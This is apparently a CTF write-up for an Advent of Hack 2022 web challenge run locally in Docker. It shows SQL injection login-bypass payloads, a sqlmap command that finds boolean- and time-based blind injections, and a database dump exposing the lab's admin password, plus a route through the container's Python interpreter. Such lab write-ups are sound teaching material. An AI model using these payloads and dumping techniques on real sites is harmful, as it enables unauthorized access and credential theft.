+++
title = "🚧 [0x04] Exploit: Broken page"
description = "Writeup for the fifth 2022's Advent of Hack CTF challenge"
date = "2022-04-29"
aliases = ["writeup", "writeups", "ctf", "ctfs"]
author = "cakehonolulu"
+++

# 1.- Provided challenge description
<br>

This one will introduce you a bit to Docker because you will need to run a docker in order to find the solution.

{{< highlight bash >}}
docker pull adventofhackupc/exploit-challenge:latest
docker run -p 8000:8000 adventofhackupc/exploit-challenge:latest
Then open http://localhost:8000/ on your pc.
{{< /highlight >}}

# 2.- Provided files
<br>
<code>None</code>


# 3.- Challenge
<br>

If you access localhost:8000/ (After pulling and running the docker image) on your preferred webbrowser, you'll be greeted with this simple website:

![BKP](/images/ctfs/hackupc/advent_of_code/bkp.png)


You can test the default user-password combinations (admin:admin, root:root...) but none of them will work...

Enter... <a href="https://portswigger.net/web-security/sql-injection">SQL Injection Attacks!</a> 

The main idea behind this challenge is to feed the site's textboxes some values that could trigger an injection, to do so, it's best to have a cheatsheet on hand
and start checking for basic SQLi payloads.

The first payload I tested was the classic: <code>admin' or '1'='1</code> which worked out-of-the-box and redirected me to the
admin sitemap.

![BKP_admin](/images/ctfs/hackupc/advent_of_code/bkp_admin.png)

Now, it's a matter of navigating inside the Codes webpage, then Code Object and...

<code>Advent{daFAkeRCUywkDTdCjuQwByTWPXiVKnyS}</code>

EDIT (11-05-2022):

I've just found another way to retrieve the flag, this is done by abusing the <code>--entrypoint</code> argument of docker

One can view the docker image build log with the image command...

{{< highlight bash >}}
$ sudo docker image history adventofhackupc/exploit-challenge:latest --no-trunc > history.txt
{{< /highlight >}}

...and by inspecting it, you can see that there are no binaries in <code>/bin</code> so you can't access the machine using a command shell.


If you further inspect the log, you'll see that <code>/usr/local/bin/python3</code> is still available for us to run so let's go ahead and do so.


{{< highlight bash >}}
Python 3.9.11 (main, Mar 18 2022, 16:45:24)
[GCC 10.2.1 20210110] on linux

Type "help", "copyright", "credits" or "license" for more information.

>>>
{{< /highlight >}}

We got in...


Alright, now what we can do is two things, first and foremost, check what's in the current directory; to do so, execute:

{{< highlight python >}}
import os;
os.lisrdir();
{{< /highlight >}}

This should print the contents of $PWD (Current working directory):

<code>['db.sqlite3', 'requirements.txt', '.dockerignore', 'manage.py', 'advent', 'venv', '.idea', 'pwned', 'templates']</code>

Aha! An sqlite database! Let's try to retrieve the flag using python:

{{< highlight python >}}
import sqlite3;
bpg = sqlite3.connect('db.sqlite3');
cursor = bpg.cursor();
{{< /highlight >}}

Now let's view all the tables the sqlite db has, we can do so using:

{{< highlight python >}}
cursor.execute("SELECT name FROM sqlite_master WHERE type='table';");
print(cursor.fetchall());
{{< /highlight >}}

<code>[('django_migrations',), ('sqlite_sequence',), ('auth_group_permissions',), ('auth_user_groups',), ('auth_user_user_permissions',), ('django_admin_log',), ('django_content_type',), ('auth_permission',), ('auth_group',), ('auth_user',), ('advent_code',), ('django_session',)]</code>


That looks... interesting... Let's print the <code>advent_code</code> table...


<code>[(1, 'daFAkeRCUywkDTdCjuQwByTWPXiVKnyS')]</code>

Aha!


<code>Advent{daFAkeRCUywkDTdCjuQwByTWPXiVKnyS}</code>



EDIT (12-05-2022):


Aaaaand... another way to pwn the challenge was found, this time, we'll deal around with a time-based SQL Injection.


It looks like the name "Broken Page" was really fitting after all... ;)


For this setup we'll need 2 utilities, PortSwigger's BURP Suite and sqlmap.


If you look inside the website's source code, you'll see that it has a field containing a CSRF Token.

While CSRF Tokens are out-of-scope for this challenge, they tend to be really obnoxious if you depend on making multiple requests
to the same website.

This is why we need a way to automatically get them for our payloads to work correctly.

Run BURP and set your browser's proxy accordingly to intercept HTTP Requests with it.

Click submit and you should see that BURP starts intercepting the requests.

![BPG](/images/ctfs/hackupc/advent_of_code/bpg.gif)


Take note of <code>csrfmiddlewaretoken</code>, it'll come in handy in the following steps.


Leave BURP open, it'll act as the proxy for sqlmap!

The next thing we'll do is run sqlmap with the following arguments:

{{< highlight bash >}}
$ sqlmap -u localhost:8000/ --data="csrfmiddlewaretoken={YOUR_TOKEN_HERE}&username=admin&password=admin" -p "csrfmiddlewaretoken,username,password" --proxy="http://127.0.0.1:8080" --level=5 --risk=3
{{< /highlight >}}


You're probably wondering what this command does, let me break it down for you:


<code>-u</code> Specifies the address to run the scan off (In our case, localhost:8000)


<code>--data</code> Specifies the data we control (csrfmiddlewaretoken field, username and password ones)


<code>-p</code> Specifies which parameters sqlmap can use to run it's tests


<code>--proxy</code> Specifies a proxy to use (We default to BURP), this helps gathering a new anti-CSRF token automatically


<code>--level=5 --risk=3</code> This parameters enable us to perform a deeper scan (Which finds the vulnerability we'll be using)


Go take a shower or make a coffee, this takes it's time.


If sqlmap asks you permission to update the CSRF token automatically, say 'Y'


Same for cookies!


IMPORTANT! If it asks you to follow a 302 redirect, say no!


At the end, you should see something like this:


{{< highlight bash >}}
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)
Payload: csrfmiddlewaretoken={YOUR_TOKEN_HERE}&username=admin%' OR NOT 2702=2702-- CFzp&password=admin


Type: time-based blind
Title: SQLite > 2.0 OR time-based blind (heavy query)
Payload: csrfmiddlewaretoken={YOUR_TOKEN_HERE}&username=admin%' OR 2531=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'kTvW%'='kTvW&password=admin
---
{{< /highlight >}}


If that's the case, congrats! You've got halfway through the challenge, now use the second payload to dump the database.

The only difference in the command is that you'll have to add <code>--dump-all</code> to start dumping the database
using the time-based SQLi. This will take a lot of time, be patient.

You could also try to dump individual tables but it's funnier to retrieve the entire DB, I'll leave it as an exercise for the reader to find how
to do so.

If you leave it running enough time you'll get not only the flag, but the real admin password too:

{{< highlight sql >}}
Database: <current>
Table: advent_code
[1 entry]
+----+-----+----------------------------------+
| id | 100 | solution                         |
+----+-----+----------------------------------+
| 1  | 100 | daFAkeRCUywkDTdCjuQwByTWPXiVKnyS |
+----+-----+----------------------------------+


Database: <current>
Table: auth_user
[1 entry]
+----+-----+-----+-----+---------+----------+--------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
| id | 128 | 150 | 254 | email   | is_staff | password                       | username | is_active | last_name | first_name | last_login                 | date_joined                | is_superuser |
+----+-----+-----+-----+---------+----------+--------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
| 1  | 128 | 150 | 254 | <blank> | 1        | )6IniSBpFVHdshB%eB4;)wnbcB.K2n | admin    | 1         | <blank>   | <blank>    | 2022-05-12 15:30:55.376943 | 2022-04-05 20:17:23.773508 | 1            |
+----+-----+-----+-----+---------+----------+--------------------------------+----------+-----------+-----------+------------+----------------------------+----------------------------+--------------+
{{< /highlight >}}

<code>Advent{daFAkeRCUywkDTdCjuQwByTWPXiVKnyS}</code>


User: <code>admin</code><br>Password: <code>)6IniSBpFVHdshB%eB4;)wnbcB.K2n</code><br><br>;)

